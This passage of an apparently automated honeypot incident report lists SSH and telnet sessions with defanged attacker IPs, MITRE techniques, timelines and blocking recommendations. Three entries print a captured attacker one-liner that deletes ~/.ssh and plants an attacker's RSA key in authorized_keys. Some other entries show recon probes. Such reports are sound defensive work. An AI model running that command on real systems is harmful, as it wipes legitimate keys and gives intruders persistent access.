| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:51:27` | `cowrie.session.connect` |
| `2026-07-03 17:51:27` | `cowrie.client.version` |
| `2026-07-03 17:51:27` | `cowrie.client.kex` |
| `2026-07-03 17:51:28` | `cowrie.login.success` |
| `2026-07-03 17:51:29` | `cowrie.session.params` |
| `2026-07-03 17:51:29` | `cowrie.command.input` |
| `2026-07-03 17:51:29` | `cowrie.command.failed` |
| `2026-07-03 17:51:29` | `cowrie.log.closed` |
| `2026-07-03 17:51:30` | `cowrie.session.params` |
| `2026-07-03 17:51:30` | `cowrie.command.input` |
| `2026-07-03 17:51:30` | `cowrie.session.file_download` |
| `2026-07-03 17:51:30` | `cowrie.log.closed` |
| `2026-07-03 17:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a8ba3130a46

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-07-03 17:51 |
| **Last Seen** | 2026-07-03 17:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:51:31` | `cowrie.session.connect` |
| `2026-07-03 17:51:31` | `cowrie.client.version` |
| `2026-07-03 17:51:31` | `cowrie.client.kex` |
| `2026-07-03 17:51:32` | `cowrie.login.success` |
| `2026-07-03 17:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd2527ea129

| Field | Detail |
|---|---|
| **Source IP** | `195.86.192[.]66` |
| **First Seen** | 2026-07-03 17:51 |
| **Last Seen** | 2026-07-03 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:51:32` | `cowrie.session.connect` |
| `2026-07-03 17:51:32` | `cowrie.client.version` |
| `2026-07-03 17:51:33` | `cowrie.client.kex` |
| `2026-07-03 17:51:34` | `cowrie.login.success` |
| `2026-07-03 17:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.86.192[.]66` to AbuseIPDB if not already reported
- [ ] Block `195.86.192[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43c89465f8b7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 17:51 |
| **Last Seen** | 2026-07-03 17:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 17:51:38` | `cowrie.session.connect` |
| `2026-07-03 17:51:39` | `cowrie.client.version` |
| `2026-07-03 17:51:39` | `cowrie.client.kex` |
| `2026-07-03 17:51:45` | `cowrie.login.success` |
| `2026-07-03 17:51:48` | `cowrie.session.params` |
| `2026-07-03 17:51:48` | `cowrie.command.input` |
| `2026-07-03 17:51:49` | `cowrie.log.closed` |
| `2026-07-03 17:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a6a42a75f3e

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-07-03 18:01 |
| **Last Seen** | 2026-07-03 18:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:01:24` | `cowrie.session.connect` |
| `2026-07-03 18:01:24` | `cowrie.client.version` |
| `2026-07-03 18:01:25` | `cowrie.client.kex` |
| `2026-07-03 18:01:25` | `cowrie.login.success` |
| `2026-07-03 18:01:26` | `cowrie.session.params` |
| `2026-07-03 18:01:26` | `cowrie.command.input` |
| `2026-07-03 18:01:26` | `cowrie.command.failed` |
| `2026-07-03 18:01:27` | `cowrie.log.closed` |
| `2026-07-03 18:01:28` | `cowrie.session.params` |
| `2026-07-03 18:01:28` | `cowrie.command.input` |
| `2026-07-03 18:01:28` | `cowrie.session.file_download` |
| `2026-07-03 18:01:28` | `cowrie.log.closed` |
| `2026-07-03 18:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65105130c496

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-07-03 18:01 |
| **Last Seen** | 2026-07-03 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:01:28` | `cowrie.session.connect` |
| `2026-07-03 18:01:28` | `cowrie.client.version` |
| `2026-07-03 18:01:28` | `cowrie.client.kex` |
| `2026-07-03 18:01:29` | `cowrie.login.success` |
| `2026-07-03 18:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881a0615e8b4

| Field | Detail |
|---|---|
| **Source IP** | `213.230.127[.]104` |
| **First Seen** | 2026-07-03 18:01 |
| **Last Seen** | 2026-07-03 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:01:29` | `cowrie.session.connect` |
| `2026-07-03 18:01:29` | `cowrie.client.version` |
| `2026-07-03 18:01:30` | `cowrie.client.kex` |
| `2026-07-03 18:01:30` | `cowrie.login.success` |
| `2026-07-03 18:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.127[.]104` to AbuseIPDB if not already reported
- [ ] Block `213.230.127[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a32dc4efd210

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 18:02 |
| **Last Seen** | 2026-07-03 18:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:02:35` | `cowrie.session.connect` |
| `2026-07-03 18:02:37` | `cowrie.client.version` |
| `2026-07-03 18:02:37` | `cowrie.client.kex` |
| `2026-07-03 18:02:43` | `cowrie.login.success` |
| `2026-07-03 18:02:46` | `cowrie.session.params` |
| `2026-07-03 18:02:46` | `cowrie.command.input` |
| `2026-07-03 18:02:48` | `cowrie.log.closed` |
| `2026-07-03 18:02:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab0d01047527

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]90` |
| **First Seen** | 2026-07-03 18:08 |
| **Last Seen** | 2026-07-03 18:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:08:43` | `cowrie.session.connect` |
| `2026-07-03 18:08:43` | `cowrie.login.success` |
| `2026-07-03 18:08:44` | `cowrie.session.params` |
| `2026-07-03 18:08:44` | `cowrie.command.input` |
| `2026-07-03 18:08:45` | `cowrie.command.input` |
| `2026-07-03 18:08:46` | `cowrie.command.input` |
| `2026-07-03 18:08:46` | `cowrie.command.input` |
| `2026-07-03 18:08:46` | `cowrie.command.failed` |
| `2026-07-03 18:08:47` | `cowrie.log.closed` |
| `2026-07-03 18:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]90` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9fcafa1d2f1

| Field | Detail |
|---|---|
| **Source IP** | `128.199.225[.]7` |
| **First Seen** | 2026-07-03 18:12 |
| **Last Seen** | 2026-07-03 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:12:11` | `cowrie.session.connect` |
| `2026-07-03 18:12:12` | `cowrie.telnet.option` |
| `2026-07-03 18:12:12` | `cowrie.telnet.option` |
| `2026-07-03 18:13:12` | `cowrie.login.success` |
| `2026-07-03 18:13:13` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `128.199.225[.]7` to AbuseIPDB if not already reported
- [ ] Block `128.199.225[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d425dc4f1cc9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 18:13 |
| **Last Seen** | 2026-07-03 18:13 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:13:32` | `cowrie.session.connect` |
| `2026-07-03 18:13:33` | `cowrie.client.version` |
| `2026-07-03 18:13:33` | `cowrie.client.kex` |
| `2026-07-03 18:13:39` | `cowrie.login.success` |
| `2026-07-03 18:13:41` | `cowrie.session.params` |
| `2026-07-03 18:13:41` | `cowrie.command.input` |
| `2026-07-03 18:13:43` | `cowrie.log.closed` |
| `2026-07-03 18:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd4da02b80d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-03 18:24 |
| **Last Seen** | 2026-07-03 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:24:07` | `cowrie.session.connect` |
| `2026-07-03 18:24:07` | `cowrie.client.version` |
| `2026-07-03 18:24:07` | `cowrie.client.kex` |
| `2026-07-03 18:24:08` | `cowrie.login.success` |
| `2026-07-03 18:24:08` | `cowrie.direct-tcpip.request` |
| `2026-07-03 18:24:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-03 18:24:08` | `cowrie.direct-tcpip.data` |
| `2026-07-03 18:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea19e664f499

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-03 18:24 |
| **Last Seen** | 2026-07-03 18:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:24:08` | `cowrie.session.connect` |
| `2026-07-03 18:24:08` | `cowrie.client.version` |
| `2026-07-03 18:24:08` | `cowrie.client.kex` |
| `2026-07-03 18:24:09` | `cowrie.login.success` |
| `2026-07-03 18:24:09` | `cowrie.direct-tcpip.request` |
| `2026-07-03 18:24:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-03 18:24:09` | `cowrie.direct-tcpip.data` |
| `2026-07-03 18:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381a286fd849

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 18:25 |
| **Last Seen** | 2026-07-03 18:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:25:16` | `cowrie.session.connect` |
| `2026-07-03 18:25:18` | `cowrie.client.version` |
| `2026-07-03 18:25:18` | `cowrie.client.kex` |
| `2026-07-03 18:25:24` | `cowrie.login.success` |
| `2026-07-03 18:25:27` | `cowrie.session.params` |
| `2026-07-03 18:25:27` | `cowrie.command.input` |
| `2026-07-03 18:25:28` | `cowrie.log.closed` |
| `2026-07-03 18:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-069ad7539531

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 18:26 |
| **Last Seen** | 2026-07-03 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:26:22` | `cowrie.session.connect` |
| `2026-07-03 18:26:22` | `cowrie.client.version` |
| `2026-07-03 18:26:22` | `cowrie.client.kex` |
| `2026-07-03 18:26:22` | `cowrie.login.success` |
| `2026-07-03 18:26:23` | `cowrie.session.params` |
| `2026-07-03 18:26:23` | `cowrie.command.input` |
| `2026-07-03 18:26:23` | `cowrie.log.closed` |
| `2026-07-03 18:26:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c699910a9fd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 18:36 |
| **Last Seen** | 2026-07-03 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:36:59` | `cowrie.session.connect` |
| `2026-07-03 18:36:59` | `cowrie.client.version` |
| `2026-07-03 18:36:59` | `cowrie.client.kex` |
| `2026-07-03 18:37:00` | `cowrie.login.success` |
| `2026-07-03 18:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db80849b57df

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-03 18:36 |
| **Last Seen** | 2026-07-03 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:36:59` | `cowrie.session.connect` |
| `2026-07-03 18:36:59` | `cowrie.client.version` |
| `2026-07-03 18:37:00` | `cowrie.client.kex` |
| `2026-07-03 18:37:00` | `cowrie.login.success` |
| `2026-07-03 18:37:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-191a368742dd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 18:37 |
| **Last Seen** | 2026-07-03 18:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:37:10` | `cowrie.session.connect` |
| `2026-07-03 18:37:11` | `cowrie.client.version` |
| `2026-07-03 18:37:11` | `cowrie.client.kex` |
| `2026-07-03 18:37:18` | `cowrie.login.success` |
| `2026-07-03 18:37:21` | `cowrie.session.params` |
| `2026-07-03 18:37:21` | `cowrie.command.input` |
| `2026-07-03 18:37:23` | `cowrie.log.closed` |
| `2026-07-03 18:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7843bbad6ae

| Field | Detail |
|---|---|
| **Source IP** | `2.26.64[.]73` |
| **First Seen** | 2026-07-03 18:46 |
| **Last Seen** | 2026-07-03 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:46:11` | `cowrie.session.connect` |
| `2026-07-03 18:46:11` | `cowrie.client.version` |
| `2026-07-03 18:46:11` | `cowrie.client.kex` |
| `2026-07-03 18:46:12` | `cowrie.login.success` |
| `2026-07-03 18:46:12` | `cowrie.session.params` |
| `2026-07-03 18:46:12` | `cowrie.command.input` |
| `2026-07-03 18:46:12` | `cowrie.command.failed` |
| `2026-07-03 18:46:12` | `cowrie.log.closed` |
| `2026-07-03 18:46:13` | `cowrie.session.params` |
| `2026-07-03 18:46:13` | `cowrie.command.input` |
| `2026-07-03 18:46:13` | `cowrie.session.file_download` |
| `2026-07-03 18:46:13` | `cowrie.log.closed` |
| `2026-07-03 18:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.64[.]73` to AbuseIPDB if not already reported
- [ ] Block `2.26.64[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cd427f3149d

| Field | Detail |
|---|---|
| **Source IP** | `2.26.64[.]73` |
| **First Seen** | 2026-07-03 18:46 |
| **Last Seen** | 2026-07-03 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:46:13` | `cowrie.session.connect` |
| `2026-07-03 18:46:13` | `cowrie.client.version` |
| `2026-07-03 18:46:14` | `cowrie.client.kex` |
| `2026-07-03 18:46:14` | `cowrie.login.success` |
| `2026-07-03 18:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.64[.]73` to AbuseIPDB if not already reported
- [ ] Block `2.26.64[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c21e5dad773c

| Field | Detail |
|---|---|
| **Source IP** | `2.26.64[.]73` |
| **First Seen** | 2026-07-03 18:46 |
| **Last Seen** | 2026-07-03 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:46:14` | `cowrie.session.connect` |
| `2026-07-03 18:46:14` | `cowrie.client.version` |
| `2026-07-03 18:46:14` | `cowrie.client.kex` |
| `2026-07-03 18:46:15` | `cowrie.login.success` |
| `2026-07-03 18:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.26.64[.]73` to AbuseIPDB if not already reported
- [ ] Block `2.26.64[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d22a9e534d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 18:46 |
| **Last Seen** | 2026-07-03 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:46:47` | `cowrie.session.connect` |
| `2026-07-03 18:46:47` | `cowrie.client.version` |
| `2026-07-03 18:46:47` | `cowrie.client.kex` |
| `2026-07-03 18:46:47` | `cowrie.login.success` |
| `2026-07-03 18:46:48` | `cowrie.direct-tcpip.request` |
| `2026-07-03 18:46:48` | `cowrie.direct-tcpip.data` |
| `2026-07-03 18:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8641214614

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 18:48 |
| **Last Seen** | 2026-07-03 18:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:48:22` | `cowrie.session.connect` |
| `2026-07-03 18:48:23` | `cowrie.client.version` |
| `2026-07-03 18:48:23` | `cowrie.client.kex` |
| `2026-07-03 18:48:29` | `cowrie.login.success` |
| `2026-07-03 18:48:33` | `cowrie.session.params` |
| `2026-07-03 18:48:33` | `cowrie.command.input` |
| `2026-07-03 18:48:35` | `cowrie.log.closed` |
| `2026-07-03 18:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce6babda850

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 18:52 |
| **Last Seen** | 2026-07-03 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:52:11` | `cowrie.session.connect` |
| `2026-07-03 18:52:11` | `cowrie.client.version` |
| `2026-07-03 18:52:11` | `cowrie.client.kex` |
| `2026-07-03 18:52:11` | `cowrie.login.success` |
| `2026-07-03 18:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a49c457618fc

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 18:52 |
| **Last Seen** | 2026-07-03 18:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 18:52:11` | `cowrie.session.connect` |
| `2026-07-03 18:52:11` | `cowrie.client.version` |
| `2026-07-03 18:52:11` | `cowrie.client.kex` |
| `2026-07-03 18:52:11` | `cowrie.login.success` |
| `2026-07-03 18:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7291efb492

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
